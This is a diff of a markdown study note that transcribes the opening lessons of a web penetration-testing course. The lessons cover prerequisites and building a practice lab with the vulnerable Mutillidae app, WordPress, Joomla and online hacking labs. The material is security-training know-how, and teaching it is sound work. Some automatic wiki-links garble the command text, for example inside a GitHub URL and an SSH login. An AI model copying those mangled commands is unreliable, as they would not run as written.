@@ -88,18 +88,17 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Protecting your websites
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980)
+#### [Protecting your websites](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980&t=0)** - [Malcolm Shore] With the dominance of Cloud and software as a service delivery, web portals are now the standard means of accessing applications.
+> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980&t=0)** - [Malcolm Shore] With the dominance of Cloud and [[SaaS|software as a service]] delivery, web portals are now the standard means of accessing applications.
 >
-> **[0:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980&t=9)** These applications might be static HTML servers, serving up information that changes only when the website is updated.
+> **[0:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980&t=9)** These applications might be static [[HTML]] servers, serving up information that changes only when the website is updated.
 >
 > **[0:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980&t=16)** They may be active servers running one or more of many different active languages.
 >
-> **[0:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980&t=23)** They may be content management systems providing easily scripted web content through one of a number of CMS solutions.
+> **[0:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980&t=23)** They may be [[Content Management Systems (CMS)|content management systems]] providing easily scripted web content through one of a number of CMS solutions.
 >
 > **[0:31](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980&t=31)** I'm Malcolm Shore and I've spent a career helping governments and businesses protect their networks and systems against cyber attacks.
 >
@@ -107,7 +106,7 @@ created: 2026-05-02
 >
 > **[0:45](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980&t=45)** We'll start by looking at the tools that we can use to enumerate the web platform.
 >
-> **[0:51](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980&t=51)** We'll see how we can gain access to information on the server and in its backend databases.
+> **[0:51](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980&t=51)** We'll see how we can gain access to information on the server and in its backend [[Databases]].
 >
 > **[0:57](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980&t=57)** And how to achieve command shells to take control of the web server.
 >
@@ -117,42 +116,41 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** web (7), cloud (1), [[HTML]] (1), [[Content Management Systems (CMS)|Content management systems]] (1), cms (1)
+> **Frameworks & Libraries:** [[HTML]] (1), [[Content Management Systems (CMS)|Content management systems]] (1), [[Databases]] (1)
 > **Env Vars:** html (1), cms (1)
 > **Speakers:** - [malcolm (1)
 
-#### What you should know before watching this course
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980)
+#### [What you should know before watching this course](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980)
 
 > [!transcript]- Transcript
 >
 > **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=0)** - [Instructor] This is a practical course.
 >
-> **[0:02](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=2)** And during this course, we'll be using the Kali Linux-based tools to do testing.
+> **[0:02](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=2)** And during this course, we'll be using the [[Kali Linux]]-based tools to do testing.
 >
-> **[0:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=8)** We'll be testing against web applications in the offensive security and Hack The Box online penetration testing labs.
+> **[0:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=8)** We'll be testing against web applications in the offensive security and Hack The Box online [[Penetration Testing]] labs.
 >
 > **[0:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=15)** Together, these provide a range of sophisticated web-based applications for us to test.
 >
 > **[0:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=22)** Where possible, we'll use the free subscription targets in these labs, but some of the more complex targets will be in the main labs.
 >
-> **[0:30](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=30)** We'll also be using the OWASP Utility Dive Vulnerable Web Application, which we can run on our local test network.
+> **[0:30](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=30)** We'll also be using the [[OWASP]] Utility Dive Vulnerable Web Application, which we can run on our local test network.
 >
-> **[0:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=39)** You should be competent in Windows and Unix host technologies, as well as having a good grasp of network protocols.
+> **[0:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=39)** You should be competent in [[Windows]] and Unix host technologies, as well as having a good grasp of network protocols.
 >
 > **[0:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=46)** A good understanding of HTTP would be an advantage.
 >
 > **[0:51](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=51)** You'll need to have a good working knowledge of Kali and some hands-on experience of testing.
 >
-> **[0:57](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=57)** You should have a working knowledge of web testing tools, in particular, Burp Suite, and you should have taken the Ethical Hacking: Web Servers and Applications course.
+> **[0:57](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=57)** You should have a working knowledge of web testing tools, in particular, [[Burp Suite]], and you should have taken the [[Ethical Hacking]]: [[Web Servers]] and Applications course.
 >
-> **[1:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=68)** You should have a basic knowledge of scripting languages, such as PHP and Python.
+> **[1:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=68)** You should have a basic knowledge of scripting languages, such as [[PHP]] and [[Python (Programming Language)|Python]].
 >
 > **[1:14](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=74)** You should be able to install third-party tools and applications that we'll use in our testing.
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** web (4), [[Kali Linux]] (1), [[Security]] (1), [[Penetration Testing]] (1), [[OWASP]] (1)
+> **Frameworks & Libraries:** [[Kali Linux]] (1), [[Penetration Testing]] (1), [[OWASP]] (1), [[Windows]] (1), [[Burp Suite]] (1)
 > **Env Vars:** owasp (1), http (1), php (1)
 > **CLI Commands:** php (1), python (1)
 > **Prerequisites:** you'll need (1), install (1)
@@ -160,14 +158,13 @@ created: 2026-05-02
 > **Analogies:** such as (1)
 > **Speakers:** - [instructor] (1)
 
-#### Disclaimer
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/disclaimer?u=76281980)
+#### [Disclaimer](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/disclaimer?u=76281980)
 
 > [!transcript]- Transcript
 >
 > **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/disclaimer?u=76281980&t=0)** - [Instructor] This is one of a series of advanced pen testing courses.
 >
-> **[0:04](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/disclaimer?u=76281980&t=4)** And in addition to Kali Linux, it uses some third-party commercial and open-source testing software.
+> **[0:04](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/disclaimer?u=76281980&t=4)** And in addition to [[Kali Linux]], it uses some third-party commercial and open-source testing software.
 >
 > **[0:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/disclaimer?u=76281980&t=11)** While we've done our best to ensure that the tools we use and the sites we reference are legitimate, testing sites can be targets for hackers and we can't provide any assurance that these sites might not be compromised when you visit them.
 >
@@ -185,7 +182,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Kali Linux]] (1), open-source (1)
+> **Frameworks & Libraries:** [[Kali Linux]] (1)
 > **Speakers:** - [instructor] (1)
 
 
@@ -193,8 +190,7 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Preparing the test environment
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980)
+#### [Preparing the test environment](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -210,7 +206,7 @@ created: 2026-05-02
 >
 > **[0:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=23)** Or we can run a VM on a home data center solution, such as Proxmox.
 >
-> **[0:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=29)** It makes no difference which environment we run our Virtual Machines in.
+> **[0:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=29)** It makes no difference which environment we run our [[Virtual Machines]] in.
 >
 > **[0:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=33)** So it's personal choice.
 >
@@ -222,7 +218,7 @@ created: 2026-05-02
 >
 > **[0:49](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=49)** There's a more recent version of mutillidae which we can load and use.
 >
-> **[0:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=54)** It runs on a LAMP Stack web server, MariaDB, Apache, and PHP on top of Linux.
+> **[0:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=54)** It runs on a LAMP Stack web server, MariaDB, Apache, and [[PHP]] on top of [[Linux]].
 >
 > **[1:01](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=61)** I've prepared a standard LAMP Stack server.
 >
@@ -234,13 +230,13 @@ created: 2026-05-02
 >
 > **[1:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=71)** Let's SSH into our LAMP server.
 >
-> **[1:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=76)** SSH and I'll use the account ubuntu@192.168.1.176.
+> **[1:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=76)** SSH and I'll use the account [[Ubuntu]]@192.168.1.176.
 >
 > **[1:25](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=85)** That's my lamp server.
 >
-> **[1:28](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=88)** And let's open SQL.
+> **[1:28](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=88)** And let's open [[SQL]].
 >
-> **[1:30](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=90)** Sudo mysql minus U, route.
+> **[1:30](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=90)** Sudo [[MySQL]] minus U, route.
 >
 > **[1:37](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=97)** And we'll set up the account we'll use from mutillidae.
 >
@@ -254,9 +250,9 @@ created: 2026-05-02
 >
 > **[2:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=149)** Now let's clone the mutillidae application.
 >
-> **[2:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=152)** CD/var/www/html.
+> **[2:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=152)** CD/var/www/[[HTML]].
 >
-> **[2:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=158)** Sudo git clone [https://github.com/webpwnized/mutillidae.git](https://github.com/webpwnized/mutillidae.git)
+> **[2:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=158)** Sudo [[Git]] clone [https://[[GitHub]].com/webpwnized/mutillidae.git](https://github.com/webpwnized/mutillidae.git)
 >
 > **[2:57](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=177)** and we'll update the account details.
 >
@@ -278,7 +274,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** web (7), cd (2), [[Git]] (2), database (2), [[Security]] (1)
+> **Frameworks & Libraries:** [[Git]] (2), [[Virtual Machines]] (1), [[PHP]] (1), [[Linux]] (1), [[Ubuntu]] (1)
 > **CLI Commands:** sudo (3), ssh (2), cd (2), git (2), apache (1)
 > **Env Vars:** lamp (3), ssh (2), php (1), sql (1)
 > **Prerequisites:** set up (5), install (1)
@@ -287,18 +283,17 @@ created: 2026-05-02
 > **Tools:** github (1)
 > **Analogies:** such as (1)
 
-#### Setting up WordPress
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980)
+#### [Setting up WordPress](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=0)** - In order to support our testing of content management systems, we'll set up the WordPress CMS on our lamp server.
+> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=0)** - In order to support our testing of [[Content Management Systems (CMS)|content management systems]], we'll set up the [[WordPress]] CMS on our lamp server.
 >
 > **[0:07](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=7)** I've SSHD into it.
 >
 > **[0:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=9)** So let's get started.
 >
-> **[0:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=11)** The first thing we'll do is to go into my SQL and add the WordPress databases, sudo my SQL minus U route, and will create database WordPress.
+> **[0:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=11)** The first thing we'll do is to go into my [[SQL]] and add the WordPress [[Databases]], sudo my SQL minus U route, and will create database WordPress.
 >
 > **[0:34](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=34)** Let's also add an administrator account that we can use for CMS support.
 >
@@ -314,9 +309,9 @@ created: 2026-05-02
 >
 > **[2:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=123)** We'll start by downloading the official salt value curl https api.[wordpress.org](https://wordpress.org).
 >
-> **[2:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=136)** Secret key 1.1 salt two WordPress slash WP dash config dot php.
+> **[2:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=136)** Secret key 1.1 salt two WordPress slash WP dash config dot [[PHP]].
 >
-> **[2:34](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=154)** And then we'll add to it the rest of the PHP file nano WordPress slash WP dash config dot php.
+> **[2:34](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=154)** And then we'll add to it the [[Representational State Transfer (REST)|rest]] of the PHP file nano WordPress slash WP dash config dot php.
 >
 > **[2:51](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=171)** We'll add the PHP header at the start php and at the end we'll add the remaining PHP configuration lines.
 >
@@ -340,7 +335,7 @@ created: 2026-05-02
 >
 > **[5:47](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=347)** Now let's move this into the web home folder.
 >
-> **[5:50](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=350)** sudo move WordPress to slash war slash www slash html slash WordPress and we'll set up the ownership and permissions sudo chown www data.
+> **[5:50](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=350)** sudo move WordPress to slash war slash www slash [[HTML]] slash WordPress and we'll set up the ownership and permissions sudo chown www data.
 >
 > **[6:14](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=374)** Www data sudo chown minus R WW data WW data slash war slash www slash html slash WordPress and sudo chard minus R 7 55 slash war slash www slash html slash WordPress.
 >
@@ -358,7 +353,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[WordPress]] (16), [[PHP]] (11), data (4), [[HTML]] (3), cms (2)
+> **Frameworks & Libraries:** [[WordPress]] (16), [[PHP]] (11), [[HTML]] (3), [[SQL]] (2), [[Content Management]] (1)
 > **CLI Commands:** php (11), sudo (6), tar (4), curl (3), chown (2)
 > **Env Vars:** php (5), abspath (3), cms (2), sql (2), sshd (1)
 > **URLs:** [wordpress.org](https://wordpress.org) (2), [cybex.com](https://cybex.com) (1)
@@ -366,14 +361,13 @@ created: 2026-05-02
 > **Versions:** 1.1 (1), 7.4 (1)
 > **Speakers:** - in (1)
 
-#### Setting up Joomla
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980)
+#### [Setting up Joomla](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=0)** - Let's install Joomla as a second content management system that we can test.
+> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=0)** - Let's install Joomla as a second [[Content Management]] system that we can test.
 >
-> **[0:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=5)** I'm logged into our local server, so we'll start our setup of Joomla by adding its database to mysql.
+> **[0:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=5)** I'm logged into our local server, so we'll start our setup of Joomla by adding its database to [[MySQL]].
 >
 > **[0:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=13)** "sudo mysql -u root" And we'll "create database joomla_db;"
 >
@@ -389,7 +383,7 @@ created: 2026-05-02
 >
 > **[1:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=83)** Okay, let's make a webroot folder and we'll unzip into it.
 >
-> **[1:28](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=88)** "sudo mkdir /var/www/html/joomla",
+> **[1:28](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=88)** "sudo mkdir /var/www/[[HTML]]/joomla",
 >
 > **[1:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=100)** and "sudo unzip joomla.zip -d"
 >
@@ -447,7 +441,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** database (4), [[HTML]] (3), [[MySQL]] (2), web (2), data (2)
+> **Frameworks & Libraries:** [[HTML]] (3), [[MySQL]] (2), [[Content Management]] (1)
 > **CLI Commands:** sudo (4), mysql (2), unzip (2), cd (1), wget (1)
 > **Prerequisites:** install (3), set up (3), setup (1)
 > **Code Identifiers:** joomla_db (2)
@@ -456,12 +450,11 @@ created: 2026-05-02
 > **UI Navigation:** go to (1)
 > **Speakers:** - let (1)
 
-#### Online testing sites
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980)
+#### [Online testing sites](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=0)** - [Malcolm] Offensive security provides a set of freely accessible machines in their penetration testing playground, and this is the first of two online testing sites we'll use during the course.
+> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=0)** - [Malcolm] Offensive security provides a set of freely accessible machines in their [[Penetration Testing]] playground, and this is the first of two online testing sites we'll use during the course.
 >
 > **[0:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=11)** We'll be using the free play tier, Proving Ground.
 >
@@ -487,7 +480,7 @@ created: 2026-05-02
 >
 > **[1:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=89)** We'll stop this and leave offensive security for now, but we'll come back to this lab later in the course.
 >
-> **[1:35](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=95)** Another penetration testing lab we'll be using for our advanced web testing is the hack-the-box lab.
+> **[1:35](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=95)** Another penetration testing lab we'll be using for our advanced web testing is the [[HackTheBox|hack-the-box]] lab.
 >
 > **[1:42](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=102)** To follow along using the more advanced systems we'll be looking at will require a paid subscription however.
 >
@@ -499,7 +492,7 @@ created: 2026-05-02
 >
 > **[2:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=131)** When we click on that, we see its IP address.
 >
-> **[2:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=135)** To connect to it, we can check connect to HTB, machines, and then either download a VPN pack to use our own testing environment or use the online parrot based test environment.
+> **[2:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=135)** To connect to it, we can check connect to [[HackTheBox|HTB]], machines, and then either download a VPN pack to use our own testing environment or use the online parrot based test environment.
 >
 > **[2:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=149)** We'll come back to both of these labs as we proceed through the course.
 >
@@ -509,7 +502,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** web (4), [[Security]] (2), [[Penetration Testing]] (2), vpn (2)
+> **Frameworks & Libraries:** [[Penetration Testing]] (2), [[HackTheBox|Hack-the-box]] (1), [[HackTheBox|Htb]] (1)
 > **Env Vars:** vpn (2), htb (1)
 > **UI Navigation:** click on (2)
 > **Versions:** 192.168.55 (1)
@@ -523,20 +516,19 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### A refresher on web technology
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980)
+#### [A refresher on web technology](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980)
 
 > [!transcript]- Transcript
 >
 > **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=0)** - [Narrator] Websites are the main conduit for computer-based information and browsers are now the preferred interface used to access application systems.
 >
-> **[0:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=10)** There are many forms of websites and to be a web application tester, we need to have a good working knowledge, not only of the underlying protocols used for web access, but also the structure of websites.
+> **[0:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=10)** There are many [[Forms]] of websites and to be a web application tester, we need to have a good working knowledge, not only of the underlying protocols used for web access, but also the structure of websites.
 >
-> **[0:24](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=24)** I introduced the basics of website testing in my ethical hacking course on hacking web servers and web applications.
+> **[0:24](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=24)** I introduced the basics of website testing in my [[Ethical Hacking]] course on hacking [[Web Servers]] and web applications.
 >
 > **[0:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=32)** Let's just refresh ourselves on what we learned about how websites are presented.
 >
-> **[0:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=38)** A web application is built using HTML and script code, running on a web server that offers an HTTP or HTTPS protocol access, the more recent WS and WSS web socket protocols or the experimental QUIC protocol.
+> **[0:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=38)** A web application is built using [[HTML]] and script code, running on a web server that offers an HTTP or HTTPS protocol access, the more recent WS and WSS web socket protocols or the experimental QUIC protocol.
 >
 > **[0:56](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=56)** It will likely use a backend database server or some form of flat file for content.
 >
@@ -556,15 +548,15 @@ created: 2026-05-02
 >
 > **[1:57](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=117)** Nowadays, much of the code is client-side, often supported with client-side data stores.
 >
-> **[2:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=123)** While content management systems have a standardized web folder structure, the folder structures for custom-built web applications will be application-specific.
+> **[2:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=123)** While [[Content Management Systems (CMS)|content management systems]] have a standardized web folder structure, the folder structures for custom-built web applications will be application-specific.
 >
 > **[2:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=133)** Also, individual web servers have their own default folder structure.
 >
 > **[2:18](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=138)** This may be changed for production, but understanding what a default website would look like for each type of server is a good start.
 >
